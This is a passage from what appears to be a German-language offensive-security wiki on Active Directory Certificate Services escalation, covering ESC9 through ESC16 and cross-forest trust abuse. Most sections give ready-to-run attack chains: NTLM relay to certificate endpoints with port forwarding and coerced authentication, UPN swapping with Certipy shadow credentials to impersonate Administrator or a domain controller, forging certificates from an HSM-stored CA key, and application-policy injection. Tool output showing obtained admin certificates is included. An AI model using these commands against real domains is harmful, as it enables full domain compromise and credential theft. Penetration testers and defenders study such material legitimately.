Eine weitere Einschränkung von NTLM relay attacks ist, dass **eine vom Angreifer kontrollierte Maschine** von einem Opferkonto authentifiziert werden muss. Der Angreifer kann entweder warten oder versuchen, diese Authentifizierung zu **erzwingen**:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Missbrauch**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` listet **aktivierte HTTP AD CS Endpunkte** auf:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Die Eigenschaft `msPKI-Enrollment-Servers` wird von unternehmensweiten Zertifizierungsstellen (CAs) verwendet, um Certificate Enrollment Service (CES)-Endpunkte zu speichern. Diese Endpunkte können mit dem Tool **Certutil.exe** geparst und aufgelistet werden:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Missbrauch mit Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Missbrauch mit [Certipy](https://github.com/ly4k/Certipy)

Die Anforderung eines Zertifikats wird von Certipy standardmäßig basierend auf der Vorlage `Machine` oder `User` vorgenommen, wobei dies davon abhängt, ob der weitergeleitete Kontoname mit `$` endet. Eine alternative Vorlage kann durch die Verwendung des Parameters `-template` angegeben werden.

Eine Technik wie [PetitPotam](https://github.com/ly4k/PetitPotam) kann anschließend eingesetzt werden, um eine Authentifizierung zu erzwingen. Bei Domänencontrollern ist die Angabe `-template DomainController` erforderlich.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Keine Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Erklärung

Der neue Wert **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) für **`msPKI-Enrollment-Flag`**, bezeichnet als ESC9, verhindert das Einbetten der **neuen `szOID_NTDS_CA_SECURITY_EXT` security extension** in ein Zertifikat. Diese Flagge wird relevant, wenn `StrongCertificateBindingEnforcement` auf `1` gesetzt ist (Standardeinstellung), was im Gegensatz zu einer Einstellung von `2` steht. Ihre Relevanz steigt in Szenarien, in denen eine schwächere Zertifikatzuordnung für Kerberos oder Schannel ausgenutzt werden könnte (wie bei ESC10), da das Fehlen von ESC9 die Anforderungen nicht verändern würde.

Die Bedingungen, unter denen die Einstellung dieser Flagge relevant wird, umfassen:

- `StrongCertificateBindingEnforcement` ist nicht auf `2` gesetzt (Standard ist `1`), oder `CertificateMappingMethods` enthält das `UPN`-Flag.
- Das Zertifikat ist in der `msPKI-Enrollment-Flag`-Einstellung mit der Flagge `CT_FLAG_NO_SECURITY_EXTENSION` markiert.
- Irgendeine Client-Authentication-EKU ist im Zertifikat angegeben.
- `GenericWrite`-Berechtigungen bestehen über ein Konto, um ein anderes zu kompromittieren.

### Missbrauchsszenario

Angenommen, `John@corp.local` hat `GenericWrite`-Berechtigungen über `Jane@corp.local`, mit dem Ziel, `Administrator@corp.local` zu kompromittieren. Die `ESC9`-Zertifikatvorlage, für die sich `Jane@corp.local` anmelden darf, ist in ihrer `msPKI-Enrollment-Flag`-Einstellung mit der Flagge `CT_FLAG_NO_SECURITY_EXTENSION` konfiguriert.

Zunächst wird `Jane`'s Hash mittels Shadow Credentials erlangt, dank `John`'s `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Anschließend wird `Jane`'s `userPrincipalName` auf `Administrator` geändert, wobei bewusst der Domain-Teil `@corp.local` weggelassen wird:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Diese Änderung verstößt nicht gegen die Einschränkungen, da `Administrator@corp.local` weiterhin als `Administrator`'s `userPrincipalName` eindeutig bleibt.

Anschließend wird die als verwundbar markierte Zertifikatvorlage `ESC9` als `Jane` angefordert:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Es fällt auf, dass der `userPrincipalName` des Zertifikats `Administrator` anzeigt und keine „object SID“ aufweist.

Der `userPrincipalName` von `Jane` wird dann auf ihren ursprünglichen Wert, `Jane@corp.local`, zurückgesetzt:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Der Versuch, sich mit dem ausgestellten Zertifikat zu authentifizieren, liefert nun den NT-Hash von `Administrator@corp.local`. Der Befehl muss `-domain <domain>` enthalten, da das Zertifikat keine Domain-Angabe hat:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Schwache Zertifikatszuordnungen - ESC10

### Erklärung

ESC10 bezieht sich auf zwei Registry-Schlüsselwerte auf dem Domänencontroller:

- Der Standardwert für `CertificateMappingMethods` unter `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ist `0x18` (`0x8 | 0x10`), zuvor auf `0x1F` gesetzt.
- Die Standardeinstellung für `StrongCertificateBindingEnforcement` unter `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ist `1`, zuvor `0`.

**Fall 1**

Wenn `StrongCertificateBindingEnforcement` auf `0` gesetzt ist.

**Fall 2**

Wenn `CertificateMappingMethods` das `UPN`-Bit (`0x4`) enthält.

### Missbrauchsfall 1

Wenn `StrongCertificateBindingEnforcement` auf `0` gesetzt ist, kann ein Konto A mit `GenericWrite`-Berechtigungen ausgenutzt werden, um jedes Konto B zu kompromittieren.

Beispielsweise, wenn man `GenericWrite`-Berechtigungen für `Jane@corp.local` hat, versucht ein Angreifer, `Administrator@corp.local` zu kompromittieren. Das Vorgehen entspricht ESC9 und erlaubt die Nutzung jeder Zertifikatvorlage.

Zunächst wird der Hash von `Jane` mittels Shadow Credentials abgerufen, wobei `GenericWrite` ausgenutzt wird.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Anschließend wird der `userPrincipalName` von `Jane` auf `Administrator` geändert, wobei bewusst der Teil `@corp.local` weggelassen wird, um eine Verletzung der Einschränkungen zu vermeiden.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Anschließend wird als `Jane` ein Zertifikat zur Client-Authentifizierung unter Verwendung der Standardvorlage `User` beantragt.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` wird dann auf den ursprünglichen Wert `Jane@corp.local` zurückgesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Die Authentifizierung mit dem erhaltenen Zertifikat liefert den NT hash von `Administrator@corp.local` und erfordert die Angabe der Domäne im Befehl, da im Zertifikat keine Informationen zur Domäne enthalten sind.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Missbrauchsfall 2

Wenn `CertificateMappingMethods` das `UPN`-Bitflag (`0x4`) enthält, kann ein Konto A mit `GenericWrite`-Berechtigungen jedes Konto B kompromittieren, das keine `userPrincipalName`-Eigenschaft besitzt, einschließlich Maschinenkonten und des integrierten Domänenadministrators `Administrator`.

Ziel ist hier, `DC$@corp.local` zu kompromittieren, beginnend damit, den Hash von `Jane` über Shadow Credentials zu erhalten, wobei `GenericWrite` ausgenutzt wird.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Der `userPrincipalName` von `Jane` wird dann auf `DC$@corp.local` gesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Ein Zertifikat zur Client-Authentifizierung wird als `Jane` mit der Standard-`User`-Vorlage angefordert.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Der `userPrincipalName` von `Jane` wird nach diesem Prozess auf den ursprünglichen Wert zurückgesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Um sich über Schannel zu authentifizieren, wird die `-ldap-shell`-Option von Certipy verwendet und zeigt eine erfolgreiche Authentifizierung als `u:CORP\DC$` an.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Über die LDAP-Shell ermöglichen Befehle wie `set_rbcd` Resource-Based Constrained Delegation (RBCD)-Angriffe und können potenziell den Domänencontroller kompromittieren.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Diese Schwachstelle betrifft auch jedes Benutzerkonto, dem ein `userPrincipalName` fehlt oder bei dem dieser nicht mit dem `sAMAccountName` übereinstimmt. Das standardmäßige Konto `Administrator@corp.local` ist ein Hauptziel, da es erweiterte LDAP-Rechte besitzt und standardmäßig keinen `userPrincipalName` hat.

## Relaying NTLM to ICPR - ESC11

### Erklärung

Wenn der CA-Server nicht mit `IF_ENFORCEENCRYPTICERTREQUEST` konfiguriert ist, können NTLM-Relay-Angriffe ohne Signierung über den RPC-Dienst durchgeführt werden. [Referenz hier](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Sie können `certipy` verwenden, um zu ermitteln, ob `Enforce Encryption for Requests` deaktiviert ist; certipy zeigt in diesem Fall `ESC11`-Vulnerabilities an.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Missbrauchsszenario

Es ist erforderlich, einen relay server einzurichten:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Hinweis: Für Domain-Controller müssen wir `-template` in DomainController angeben.

Oder mit [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell-Zugriff auf ADCS CA mit YubiHSM - ESC12

### Erklärung

Administratoren können die Zertifizierungsstelle so einrichten, dass sie auf einem externen Gerät wie dem "Yubico YubiHSM2" gespeichert wird.

If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.

This key/password is stored in the registry under `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Missbrauchsszenario

Wenn der private Schlüssel der CA auf einem physischen USB-Gerät gespeichert ist und Sie Shell-Zugriff erhalten haben, ist es möglich, den Schlüssel wiederherzustellen.

Zuerst müssen Sie das CA-Zertifikat (dies ist öffentlich) beschaffen und dann:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Verwenden Sie abschließend den certutil `-sign`-Befehl, um ein neues beliebiges Zertifikat mithilfe des CA-Zertifikats und dessen privatem Schlüssel zu fälschen.

## OID Group Link Abuse - ESC13

### Erklärung

Das Attribut `msPKI-Certificate-Policy` ermöglicht das Hinzufügen einer Ausstellungsrichtlinie zur Zertifikatvorlage. Die `msPKI-Enterprise-Oid`-Objekte, die für die Vergabe dieser Richtlinien verantwortlich sind, können im Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) des PKI OID-Containers gefunden werden. Eine Richtlinie kann mit einer AD-Gruppe verknüpft werden, indem das Attribut `msDS-OIDToGroupLink` dieses Objekts verwendet wird, wodurch ein System einen Benutzer, der das Zertifikat vorlegt, so autorisieren kann, als ob er Mitglied dieser Gruppe wäre. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Mit anderen Worten: Wenn ein Benutzer die Berechtigung hat, ein Zertifikat zu beantragen und das Zertifikat mit einer OID-Gruppe verknüpft ist, kann der Benutzer die Privilegien dieser Gruppe übernehmen.

Verwenden Sie [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

Finde eine Benutzerberechtigung, die man mit `certipy find` oder `Certify.exe find /showAllPermissions` ausfindig machen kann.

Wenn `John` die Berechtigung hat, `VulnerableTemplate` zu enrollen, kann der Benutzer die Privilegien der Gruppe `VulnerableGroup` übernehmen.

Alles, was er tun muss, ist das Template anzugeben; er erhält dann ein Zertifikat mit OIDToGroupLink-Rechten.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Schwache Konfiguration der Zertifikatserneuerung - ESC14

### Erläuterung

Die Beschreibung unter https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ist bemerkenswert ausführlich. Nachfolgend eine Zitierung des Originaltextes.

ESC14 behandelt Schwachstellen, die aus "weak explicit certificate mapping" entstehen, hauptsächlich durch den Missbrauch oder unsichere Konfiguration des Attributes `altSecurityIdentities` an Active Directory-Benutzer- oder Computerobjekten. Dieses multiwertige Attribut erlaubt es Administratoren, X.509-Zertifikate manuell einem AD-Konto für Authentifizierungszwecke zuzuordnen. Wenn es befüllt ist, können diese expliziten Zuordnungen die standardmäßige Zertifikatszuordnungslogik überschreiben, die typischerweise auf UPNs oder DNS-Namen im SAN des Zertifikats oder auf der in der `szOID_NTDS_CA_SECURITY_EXT` Security-Extension eingebetteten SID beruht.

Eine "schwache" Zuordnung tritt auf, wenn der Stringwert, der innerhalb des Attributes `altSecurityIdentities` zur Identifikation eines Zertifikats verwendet wird, zu allgemein, leicht zu erraten, abhängig von nicht-eindeutigen Zertifikatsfeldern oder aus leicht zu fälschenden Zertifikatkomponenten zusammengesetzt ist. Wenn ein Angreifer ein Zertifikat beschaffen oder erstellen kann, dessen Attribute mit einer derart schwach definierten expliziten Zuordnung für ein privilegiertes Konto übereinstimmen, kann er dieses Zertifikat verwenden, um sich als dieses Konto zu authentifizieren und es zu impersonifizieren.

Beispiele für potenziell schwache `altSecurityIdentities`-Mapping-Strings sind:

- Mapping ausschließlich über einen allgemeinen Subject Common Name (CN): z. B. `X509:<S>CN=SomeUser`. Ein Angreifer könnte in der Lage sein, ein Zertifikat mit diesem CN aus einer weniger sicheren Quelle zu erhalten.
- Verwendung übermäßig generischer Issuer Distinguished Names (DNs) oder Subject DNs ohne weitere Qualifikationen wie eine spezifische Seriennummer oder subject key identifier: z. B. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Einsatz anderer vorhersehbarer Muster oder nicht-kriptografischer Identifikatoren, die ein Angreifer in einem Zertifikat, das er legal erhalten oder (bei Kompromittierung einer CA oder einer verwundbaren Vorlage wie in ESC1) fälschen kann, erfüllen könnte.

Das Attribut `altSecurityIdentities` unterstützt verschiedene Formate für die Zuordnung, wie zum Beispiel:

- `X509:<I>IssuerDN<S>SubjectDN` (Zuordnung nach vollständigem Issuer- und Subject-DN)
- `X509:<SKI>SubjectKeyIdentifier` (Zuordnung nach dem Subject Key Identifier des Zertifikats)
- `X509:<SR>SerialNumberBackedByIssuerDN` (Zuordnung nach Seriennummer, implizit qualifiziert durch den Issuer DN) - dies ist kein Standardformat, normalerweise ist es `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (Zuordnung nach einem RFC822-Namen, typischerweise einer E-Mail-Adresse, aus dem SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (Zuordnung nach einem SHA1-Hash des rohen Public Keys des Zertifikats - generell stark)

Die Sicherheit dieser Zuordnungen hängt stark von der Spezifität, Einzigartigkeit und kryptografischen Stärke der in der Mapping-String gewählten Zertifikatsidentifier ab. Selbst mit aktivierten starken certificate binding modes auf Domänencontrollern (die hauptsächlich implizite Zuordnungen basierend auf SAN-UPNs/DNS und der SID-Extension beeinflussen) kann ein schlecht konfigurierter `altSecurityIdentities`-Eintrag trotzdem einen direkten Weg zur Impersonation bieten, wenn die Mapping-Logik selbst fehlerhaft oder zu permissiv ist.

### Missbrauchsszenario

ESC14 richtet sich gegen **explicit certificate mappings** in Active Directory (AD), speziell gegen das Attribut `altSecurityIdentities`. Wenn dieses Attribut gesetzt ist (durch Design oder Fehlkonfiguration), können Angreifer Konten impersonifizieren, indem sie Zertifikate präsentieren, die der Zuordnung entsprechen.

#### Szenario A: Angreifer kann auf `altSecurityIdentities` schreiben

**Voraussetzung**: Der Angreifer hat Schreibrechte auf das `altSecurityIdentities`-Attribut des Zielkontos oder die Berechtigung, es zu vergeben in Form einer der folgenden Berechtigungen am Ziel-AD-Objekt:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Szenario B: Ziel hat schwache Zuordnung via X509RFC822 (E-Mail)

- **Voraussetzung**: Das Ziel hat eine schwache X509RFC822-Zuordnung in altSecurityIdentities. Ein Angreifer kann das mail-Attribut des Opfers so setzen, dass es dem X509RFC822-Namen des Ziels entspricht, ein Zertifikat als das Opfer enrollen und dieses Zertifikat verwenden, um sich als das Ziel zu authentifizieren.

#### Szenario C: Ziel hat X509IssuerSubject-Zuordnung

- **Voraussetzung**: Das Ziel hat eine schwache X509IssuerSubject-explizite Zuordnung in `altSecurityIdentities`. Der Angreifer kann das `cn`- oder `dNSHostName`-Attribut eines Opferprinzipals so setzen, dass es dem Subject der X509IssuerSubject-Zuordnung des Ziels entspricht. Anschließend kann der Angreifer ein Zertifikat als das Opfer enrollen und dieses Zertifikat verwenden, um sich als das Ziel zu authentifizieren.

#### Szenario D: Ziel hat X509SubjectOnly-Zuordnung

- **Voraussetzung**: Das Ziel hat eine schwache X509SubjectOnly-explizite Zuordnung in `altSecurityIdentities`. Der Angreifer kann das `cn`- oder `dNSHostName`-Attribut eines Opferprinzipals so setzen, dass es dem Subject der X509SubjectOnly-Zuordnung des Ziels entspricht. Anschließend kann der Angreifer ein Zertifikat als das Opfer enrollen und dieses Zertifikat verwenden, um sich als das Ziel zu authentifizieren.

### konkrete Operationen
#### Szenario A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Zertifikat speichern und konvertieren
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Authentifizieren (mit dem Zertifikat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Bereinigung (optional)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Für spezifischere Angriffsverfahren in verschiedenen Angriffsszenarien siehe: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Anwendungsrichtlinien(CVE-2024-49019) - ESC15

### Erklärung

Die Beschreibung auf https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc ist bemerkenswert ausführlich. Im Folgenden ein Zitat des Originaltextes.

Mit den eingebauten Standard-Zertifikatvorlagen der Version 1 kann ein Angreifer ein CSR erstellen, das Anwendungsrichtlinien enthält, die gegenüber den in der Vorlage konfigurierten Extended Key Usage-Attributen bevorzugt werden. Die einzige Voraussetzung sind Enrollment-Rechte, und damit lassen sich mit der **_WebServer_** Vorlage client authentication-, certificate request agent- und codesigning-Zertifikate erzeugen.

### Ausnutzung

Das Folgende bezieht sich auf [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Klicken Sie, um detailliertere Nutzungsmethoden zu sehen.

Der `find`-Befehl von Certipy kann dabei helfen, V1-Vorlagen zu identifizieren, die potenziell für ESC15 anfällig sind, falls die CA nicht gepatcht ist.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Szenario A: Direct Impersonation via Schannel

**Schritt 1: Fordere ein Zertifikat an und injiziere die Application Policy "Client Authentication" sowie die Ziel-UPN.** Angreifer `attacker@corp.local` zielt auf `administrator@corp.local` unter Verwendung der V1-Vorlage "WebServer" (die ein vom Enrollee bereitgestelltes Subject erlaubt).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Das verwundbare V1-Template mit "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Fügt die OID `1.3.6.1.5.5.7.3.2` in die Application Policies-Erweiterung des CSR ein.
- `-upn 'administrator@corp.local'`: Setzt den UPN im SAN zur Identitätsübernahme.

**Schritt 2: Authentifiziere über Schannel (LDAPS) mit dem erhaltenen Zertifikat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Szenario B: PKINIT/Kerberos-Identitätsübernahme durch Missbrauch eines Enrollment Agents

**Schritt 1: Fordere ein Zertifikat von einer V1-Vorlage an (mit "Enrollee supplies subject"), und injiziere die Application Policy "Certificate Request Agent".** Dieses Zertifikat dient dazu, dass der Angreifer (`attacker@corp.local`) Enrollment Agent wird. Es wird hier kein UPN für die Identität des Angreifers angegeben, da das Ziel die Agentenberechtigung ist.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injiziert OID `1.3.6.1.4.1.311.20.2.1`.

**Schritt 2: Verwende das "agent" Zertifikat, um im Namen eines privilegierten Zielbenutzers ein Zertifikat anzufordern.** Dies ist ein ESC3-like-Schritt, bei dem das Zertifikat aus Schritt 1 als "agent" Zertifikat verwendet wird.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Schritt 3: Authentifiziere dich als privilegierter Benutzer mithilfe des "on-behalf-of"-Zertifikats.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Erklärung

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** bezieht sich auf das Szenario, in dem, wenn die Konfiguration von AD CS nicht erzwingt, dass die **szOID_NTDS_CA_SECURITY_EXT**-Erweiterung in allen Zertifikaten enthalten ist, ein Angreifer dies ausnutzen kann, indem er:

1. Ein Zertifikat **without SID binding** anfordert.

2. Dieses Zertifikat **for authentication as any account** verwendet, z. B. um sich als ein hoch privilegiertes Konto auszugeben (z. B. ein Domain Administrator).

Sie können auch diesen Artikel lesen, um mehr über das detaillierte Prinzip zu erfahren: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Missbrauch

Das Folgende bezieht sich auf [diesen Link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), klicken Sie, um detailliertere Anwendungsanleitungen zu sehen.

Um festzustellen, ob die Active Directory Certificate Services (AD CS) Umgebung für **ESC16** verwundbar ist
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Schritt 1: Initiale UPN des Zielkontos lesen (optional - zur Wiederherstellung).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Schritt 2: Aktualisiere die UPN des Opferkontos auf den `sAMAccountName` des Zieladministrators.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Schritt 3: (falls erforderlich) credentials für das "victim"-Konto erhalten (z. B. via Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Schritt 4: Fordere ein Zertifikat als "victim"-Benutzer von _einer beliebigen geeigneten Client-Authentifizierungs-Vorlage_ (z. B. "User") auf der ESC16-verwundbaren CA an.** Da die CA für ESC16 verwundbar ist, wird sie die SID-Sicherheits-Erweiterung im ausgestellten Zertifikat automatisch weglassen, unabhängig von den spezifischen Einstellungen der Vorlage für diese Erweiterung. Setze die Kerberos-Credential-Cache-Umgebungsvariable (Shell-Befehl):
```bash
export KRB5CCNAME=victim.ccache
```
Fordere dann das Zertifikat an:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Schritt 5: Setze die UPN des "Opfer"-Kontos zurück.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Schritt 6: Authentifiziere dich als Zieladministrator.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Kompromittierung von Forests durch Zertifikate in Passivform erklärt

### Bruch von Forest-Trusts durch kompromittierte CAs

Die Konfiguration für **cross-forest enrollment** wird relativ einfach gestaltet. Das **root CA certificate** aus dem resource forest wird von Administratoren in die **account forests publiziert**, und die **enterprise CA**-Zertifikate aus dem resource forest werden in die **`NTAuthCertificates` und AIA Container in jedem account forest hinzugefügt**. Zur Verdeutlichung: Diese Anordnung gewährt der **CA im resource forest vollständige Kontrolle** über alle anderen Forests, für die sie PKI verwaltet. Sollte diese CA von Angreifern **kompromittiert werden**, könnten Zertifikate für alle Benutzer sowohl im resource- als auch im account-forest von diesen **gefälscht werden**, wodurch die Sicherheitsgrenze des Forests gebrochen würde.

### Anmeldeberechtigungen, die fremden Principals gewährt werden

In Multi-Forest-Umgebungen ist Vorsicht geboten gegenüber Enterprise CAs, die **certificate templates veröffentlichen**, welche **Authenticated Users oder foreign principals** (Benutzer/Gruppen außerhalb des Forests, zu dem die Enterprise CA gehört) **Anmelde- und Bearbeitungsrechte** erlauben.\
